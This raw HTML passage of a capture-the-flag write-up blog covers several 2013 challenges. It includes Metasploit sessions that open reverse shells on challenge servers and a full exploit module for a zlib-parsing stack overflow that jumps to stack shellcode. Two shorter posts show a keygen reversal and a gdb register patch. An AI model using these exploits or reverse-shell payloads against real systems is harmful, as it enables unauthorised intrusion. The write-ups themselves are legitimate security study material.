</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  50.142.246.171   yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 50.142.246.171:4444
</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Started reverse handler on 0.0.0.0:4444
</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
</span><span class='line'>What is your name?
</span><span class='line'>
</span><span class='line'><span class="o">[</span><em><span class="o">]</span> Welcome, |??<span class="o">(</span>!
</span><span class='line'>Please provide a <span class="nb">time </span>format:
</span><span class='line'>
</span><span class='line'><span class="o">[</span></em><span class="o">]</span> Your formatted <span class="nb">time </span>is:
</span><span class='line'>??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????j<span class="o">)</span>X?j_j^H?H?
</span><span class='line'>
</span><span class='line'>Thank you! Come again!
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.101:4444 -&gt; 204.236.213.69:36107<span class="o">)</span> at 2013-02-16 16:49:49 -0500
</span><span class='line'>
</span><span class='line'>cat key
</span><span class='line'>cat: key: No such file or directory
</span><span class='line'>whoami
</span><span class='line'>shiftd
</span><span class='line'><span class="nb">cd</span> /home/shiftd
</span><span class='line'>ls
</span><span class='line'>key
</span><span class='line'>shiftd
</span><span class='line'>cat key
</span><span class='line'>http://shifty.urbanup.com/4195551
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<p>http://shifty.urbanup.com/4195551</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/02/17/gits-2013-funny-business/">GitS 2013 - Funny Business</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-02-17T13:53:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/02/17/gits-2013-funny-business/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>Points: 100</p>

<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1">File</a> running at funnybusiness.2013.ghostintheshellcode.com)</p>

<h2>Analysis</h2>

<p>In order to get the binary to run on 32-bit Linux, you first need to run:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>adduser funnybusiness
</span><span class='line'><span class="nv">$ </span>sudo su
</span><span class='line'><span class="nv">$ </span>./funnybiz.elf
</span></code></pre></td></tr></table></div></figure></p>

<p>Application is running on port 49681:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>netstat -antp | grep LISTEN | grep funnybiz
</span><span class='line'>tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf
</span></code></pre></td></tr></table></div></figure></p>

<p>Let&#8217;s look at HexRays decompilation of sub<em>8048C60:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>int __cdecl sub</em>8048D70<span class="o">(</span>int sock<em>fd<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  int v1; // ebx@1
</span><span class='line'>  char v3; // <span class="o">[</span>sp+1Fh<span class="o">]</span> <span class="o">[</span>bp-Dh<span class="o">]</span>@4
</span><span class='line'>
</span><span class='line'>  *<span class="o">(</span></em>QWORD *<span class="o">)</span>&amp;strm.zalloc <span class="o">=</span> 0LL;
</span><span class='line'>  strm.opaque <span class="o">=</span> 0;
</span><span class='line'>  *<span class="o">(</span><em>QWORD *<span class="o">)</span>&amp;strm.next</em>in <span class="o">=</span> 0LL;
</span><span class='line'>  <span class="nv">v1</span> <span class="o">=</span> inflateInit<em><span class="o">(</span>&amp;strm, <span class="s2">&quot;1.2.7&quot;</span>, 56<span class="o">)</span>;
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> !v1 <span class="o">)</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;strm.avail</em>in, 4<span class="o">)</span>;
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span> strm.avail<em>in &lt;<span class="o">=</span> 0x4000 <span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>      read</em>data<em>from</em>socket<span class="o">(</span>sock<em>fd, &amp;v3, strm.avail</em>in<span class="o">)</span>;
</span><span class='line'>      strm.next<em>in <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;v3;
</span><span class='line'>      strm.avail</em>out <span class="o">=</span> 16384;
</span><span class='line'>      strm.next<em>out <span class="o">=</span> <span class="o">(</span>Bytef *<span class="o">)</span>&amp;unk</em>804B0A0;
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span> inflate<span class="o">(</span>&amp;strm, 4<span class="o">)</span> !<span class="o">=</span> 1 <span class="o">)</span>
</span><span class='line'>        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>;
</span><span class='line'>      inflateEnd<span class="o">(</span>&amp;strm<span class="o">)</span>;
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">return </span>v1;
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.</p>

<p>The second call to read<em>from</em>socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn&#8217;t even a buffer allocated for the data. </p>

<p>The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don&#8217;t have to worry about the appended data.</p>

<p>Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@stack0ns-MacBook-Pro:~&gt; ./msfelfscan funnybiz.elf -j esp
</span><span class='line'><span class="o">[</span>/Users/stacks0n/funnybiz.elf<span class="o">]</span>
</span><span class='line'>0x08049043 jmp esp
</span></code></pre></td></tr></table></div></figure>

<p>MSF module as follows:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
</span><span class='line'><span class="c1">##</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - Funny Business&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;License&#39;</span>        <span class="o">=&gt;</span> <span class="no">MSF</em>LICENSE</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">register_options</span><span class="p">(</span>
</span><span class='line'>                        <span class="o">[</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">49681</span><span class="p">)</span>
</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>                <span class="n">connect</span>
</span><span class='line'>                <span class="c1"># we must send valid zlib data so the code doesn&#39;t exit</span>
</span><span class='line'>                <span class="c1"># this is zlib deflation of a single &#39;a&#39;</span>
</span><span class='line'>                <span class="n">zlib</span>    <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C</span><span class="s2">&quot;</span>
</span><span class='line'>                <span class="n">padding</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90\x90\x90</span><span class="s2">&quot;</span>
</span><span class='line'>                <span class="n">rop</span>     <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x43\x90\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># jmp esp</span>
</span><span class='line'>                <span class="nb">p</span>       <span class="o">=</span> <span class="n">zlib</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the size of our payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="o">[</span><span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">))</span>
</span><span class='line'>                <span class="c1"># send the payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">handler</span>
</span><span class='line'>                <span class="n">disconnect</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/gits/funny_business<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  54.235.156.9     yes       The target address
</span><span class='line'>   RPORT  49681            yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x86/shell_reverse_tcp<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  68.47.237.170     yes       The listen address
</span><span class='line'>   LPORT  4444             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>msf  exploit<span class="o">(</span>funny_business<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>-<span class="o">]</span> Handler failed to <span class="nb">bind </span>to 68.47.237.170:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 0.0.0.0:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.1.30:4444 -&gt; 54.235.156.9:57768<span class="o">)</span> at 2013-02-15 23:54:39 -0500
</span><span class='line'>
</span><span class='line'>cat key
</span><span class='line'>Compressions can be hard at <span class="nb">times</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>Compressions can be hard at times</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/01/07/hack-you-too-keygen-me/">Hack You Too - Keygen Me?</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-01-07T21:14:00-05:00" pubdate data-updated="true">Jan 7<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/01/07/hack-you-too-keygen-me/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>You need the right key.</p>

<p>File: <a href="http://hackyou.ctf.su/files/keygen_me.exe">keygen_me.exe</a></p>

<h2>Analysis</h2>

<p>Windows GUI executable. Simply takes one input and appears to check the result. When we enter junk, we get a message of <code>xD Try again!</code>. Looking at the strings, it is not completely obvious where this is printed. However, there are not many user functions and eventually we see a call to <a href="http://msdn.microsoft.com/en-us/library/ms645489%28VS.85%29.aspx">GetDlgItemTextA()</a> which stores user input from dialog box into a buffer.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:01391252                 call    ds:GetDlgItemTextA</span></code></pre></td></tr></table></div></figure></p>

<p>Just following loading the user input into the buffer, we see manipulation of the data and a character by character comparison afterwards.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:01391260 loc<em>1391260:
</span><span class='line'>.text:01391260                 mov     dl, [ebp+eax+String]
</span><span class='line'>.text:01391264                 add     dl, al
</span><span class='line'>.text:01391266                 xor     dl, byte ptr [ebp+eax+Hackplanet]
</span><span class='line'>.text:0139126A                 inc     eax
</span><span class='line'>.text:0139126B                 mov     [ebp+eax+key], dl
</span><span class='line'>.text:0139126F                 cmp     eax, 11
</span><span class='line'>.text:01391272                 jl      short loc</em>1391260
</span><span class='line'>.text:01391274                 cmp     [ebp+key+1], 39
</span><span class='line'>.text:01391278                 jnz     short loc<em>13912C5
</span><span class='line'>.text:0139127A                 cmp     [ebp+key+2], 15
</span><span class='line'>.text:0139127E                 jnz     short loc</em>13912C5
</span><span class='line'>.text:01391280                 cmp     [ebp+key+3], 11
</span><span class='line'>.text:01391284                 jnz     short loc<em>13912C5
</span><span class='line'>.text:01391286                 cmp     [ebp+key+4], 1
</span><span class='line'>.text:0139128A                 jnz     short loc</em>13912C5
</span><span class='line'>.text:0139128C                 cmp     [ebp+key+5], 60
</span><span class='line'>.text:01391290                 jnz     short loc<em>13912C5
</span><span class='line'>.text:01391292                 mov     cl, 10
</span><span class='line'>.text:01391294                 cmp     [ebp+key+6], cl
</span><span class='line'>.text:01391297                 jnz     short loc</em>13912C5
</span><span class='line'>.text:01391299                 mov     al, 8
</span><span class='line'>.text:0139129B                 cmp     [ebp+key+7], al
</span><span class='line'>.text:0139129E                 jnz     short loc<em>13912C5
</span><span class='line'>.text:013912A0                 cmp     [ebp+key+8], 28
</span><span class='line'>.text:013912A4                 jnz     short loc</em>13912C5
</span><span class='line'>.text:013912A6                 cmp     [ebp+key+9], al
</span><span class='line'>.text:013912A9                 jnz     short loc<em>13912C5
</span><span class='line'>.text:013912AB                 cmp     [ebp+key+0Ah], 25
</span><span class='line'>.text:013912AF                 jnz     short loc</em>13912C5
</span><span class='line'>.text:013912B1                 cmp     [ebp+key+0Bh], cl</span></code></pre></td></tr></table></div></figure></p>

<p>The following Ruby code reverses the above
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;Hackplanet&quot;</span>
</span><span class='line'><span class="n">solution</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x19</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">solution</span><span class="o">.</span><span class="n">each_index</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>    <span class="nb">print</span> <span class="p">((</span> <span class="n">key</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="n">ord</span> <span class="o">^</span> <span class="n">solution</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">chr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@stacks0ns-MacBook-Pro:~&gt; ./keygen_me.rb
</span><span class='line'>omfgHacked
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<p>omfgHacked</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/01/02/atast-2012-challenge-11/">ATAST 2012 - Challenge 11</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-01-02T22:00:00-05:00" pubdate data-updated="true">Jan 2<span>nd</span>, 2013</time>
        
         | <a href="/blog/2013/01/02/atast-2012-challenge-11/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Analysis</h2>

<p>Reversing challenge. Program calls getuid() and compares against 0x934 before printing token.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.text:0804852E                 call    <em>getuid
</span><span class='line'>.text:08048533                 cmp     eax, 2356
</span><span class='line'>.text:08048538                 jz      short loc</em>804855E
</span><span class='line'>.text:0804853A                 mov     dword ptr [esp], offset s ; &quot;Anuthorized Usage Deteceted &quot;
</span><span class='line'>.text:08048541                 call    <em>puts
</span><span class='line'>.text:08048546                 mov     dword ptr [esp], offset aProgramShuttin ; &quot;PROGRAM SHUTTING DOWN &quot;
</span><span class='line'>.text:0804854D                 call    _puts
</span><span class='line'>.text:08048552                 mov     dword ptr [esp], 1 ; status
</span><span class='line'>.text:08048559                 call    _exit
</span><span class='line'>.text:0804855E ; ---------------------------------------------------------------------------
</span><span class='line'>.text:0804855E
</span><span class='line'>.text:0804855E loc</em>804855E:                            ; CODE XREF: main+64j
</span><span class='line'>.text:0804855E                 mov     eax, offset format ; &quot;your token is %s\n&quot;
</span><span class='line'>.text:08048563                 lea     edx, [esp+32h]
</span><span class='line'>.text:08048567                 mov     [esp+4], edx
</span><span class='line'>.text:0804856B                 mov     [esp], eax      ; format
</span><span class='line'>.text:0804856E                 call    <em>printf</span></code></pre></td></tr></table></div></figure>
Simply change execution and get your flag:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) b * 0x08048533
</span><span class='line'>Breakpoint 1 at 0x8048533
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048533 in main ()
</span><span class='line'>(gdb) set $eax=0x934
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>your token is Y0U</em>G07<em>An07h3R</em>345Y_Fl49</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<p>Y0U<em>G07</em>An07h3R<em>345Y</em>Fl49</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/blog/page/3/">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton&#8217;s Corporate Security Safe for Business</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
      </li>
    
  </ul>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  <script type="text/javascript">
    $.domReady(function(){
      getTwitterFeed("captchaflag", 4, false);
    });
  </script>
  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
  
    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
  
</section>


  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Captchaflag -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'captchaflag';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
